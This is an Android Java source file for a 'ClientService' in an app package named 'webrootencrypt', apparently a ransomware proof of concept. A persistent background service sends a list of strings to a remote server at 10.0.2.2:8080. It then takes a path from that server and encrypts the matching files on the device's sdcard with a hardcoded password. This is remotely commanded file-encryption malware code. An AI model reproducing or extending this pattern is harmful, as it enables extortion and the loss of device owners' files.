package webroot.com.webrootencrypt;

import android.app.IntentService;
import android.content.Intent;
import android.os.IBinder;
import android.os.NetworkOnMainThreadException;
import android.util.Log;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;


/**
 * Created by jfermin on 11/9/2015.
 */
public class ClientService extends IntentService {

    /**
     * Creates an IntentService.  Invoked by your subclass's constructor.
     */
    public ClientService() {
        super(ClientService.class.getName());
    }

    @Override
    public IBinder onBind(Intent arg0) {
        return null;
    }

    @Override
    public void onHandleIntent(Intent intent) {
        // Let it continue running until it is stopped.
        // Toast.makeText(this, "Service Started", Toast.LENGTH_LONG).show();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId); // If this is not written then onHandleIntent is not called.
        return START_STICKY;
    }

    protected static void listenToServer(Socket socket)
    {
        try {
            BufferedReader in;

            try {
                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                // get lines from client
                String text;
                String finalText = "";
                while ((text = in.readLine()) != null) {
                    finalText += text;
                }

                // Encrypt folder/file from sdcard
                Encrypt.encrypt("/storage/sdcard/" + finalText, "password");
                Log.d("TCP", "C: Encrypted.");
                Log.d("TCP", "C: Done.");

            } catch (Exception e) {
                Log.e("TCP", "S: Error", e);
            } finally {
                socket.close();
                Log.d("TCP", "C: Socket closed.");
            }
        } catch (IOException e) {
            Log.e("TCP", "C: IOException", e);
            e.printStackTrace();
        } catch (NetworkOnMainThreadException e) {
            e.printStackTrace();
        }
    }

    protected static Socket sendToClient(ArrayList<String> toSend) {
        try {
            InetAddress serverAddr = InetAddress.getByName("10.0.2.2");
            Log.d("TCP", "C: Connecting...");

            Socket socket = new Socket(serverAddr, 8080);

            ArrayList<String> message = toSend;
            System.out.println(message);

            PrintWriter out = null;
            BufferedReader in = null;

            try {
                Log.d("TCP", "C: Sending: '" + message + "'");
                out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())), true);

                out.println(message);

                Log.d("TCP", "C: Sent.");
                Log.d("TCP", "C: Done.");
            } catch (Exception e) {
                Log.e("TCP", "S: Error", e);
            } finally {
                return(socket);
            }
        } catch (UnknownHostException e) {
            Log.e("TCP", "C: UnknownHostException", e);
            e.printStackTrace();
        } catch (IOException e) {
            Log.e("TCP", "C: IOException", e);
            e.printStackTrace();
        } catch (NetworkOnMainThreadException e){
            e.printStackTrace();
        }
        return(null);
    }
}
